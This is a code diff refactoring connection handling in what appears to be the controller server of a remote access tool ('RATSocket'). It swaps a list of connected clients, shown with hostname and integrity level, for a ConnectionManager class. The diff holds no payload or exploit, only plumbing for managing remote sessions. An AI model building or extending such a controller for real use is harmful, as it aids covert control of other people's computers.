@@ -13,6 +13,7 @@ from server.commands.executor import CommandExecutor
 from server.config.config import SOCKET_ADDR
 from core.utils.server_util import *
 from server.connection.client_connection import ClientConnection
+from server.connection.connection_manager import ConnectionManager
 
 
 class Server:
@@ -24,7 +25,7 @@ class Server:
         """
         self.address = address
         self.socket = RATSocket()
-        self.connections = []  # 存放已建立的连接
+        self.connections = ConnectionManager()
         self.alias_manager = AliasManager()
 
     def serve(self):
@@ -54,7 +55,7 @@ class Server:
                 conn.settimeout(None)
                 info = {**{'addr': f'{addr[0]}:{addr[1]}'}, **info}  # 更新客户端信息
                 connection = ClientConnection(conn, addr, info)
-                self.connections.append(connection)  # 将连接添加到连接列表
+                self.connections.add(connection)  # 将连接添加到连接列表
                 logger.info('Connection has been established: {}'.format(addr))
                 threading.Thread(target=self.connection_handler, args=(connection,), daemon=True).start()  # 启动新线程处理连接
             except socket.error as e:
@@ -70,7 +71,8 @@ class Server:
                 conn.recv_result()
             except socket.error:
                 logger.error(f'Connection closed: {conn.address}')
-                conn._results_queue.put(status=0, message='Receiving aborted')
+                conn._results_queue.put_status(0)  # 用put_status替代直接put
+                # conn._results_queue.put(status=0, message='Receiving aborted')
                 self.connections.remove(conn)
                 break
             except:
@@ -81,7 +83,7 @@ class Server:
         """
         显示连接列表
         """
-        if not self.connections:
+        if not self.connections.list():
             print("No active connections at present")
             return
 
@@ -96,7 +98,7 @@ class Server:
                 conn.info.get('hostname', 'Unknown'),
                 conn.info.get('integrity', '?')
             ]
-            for i, conn in enumerate(self.connections)
+            for i, conn in enumerate(self.connections.list())
         ]
 
         # 使用通用方法打印表格
@@ -108,7 +110,7 @@ class Server:
         :return: 连接
         """
         try:
-            return self.connections[len(self.connections) - 1]
+            return self.connections.last()
         except IndexError:
             raise Exception('No connection at this time')
 
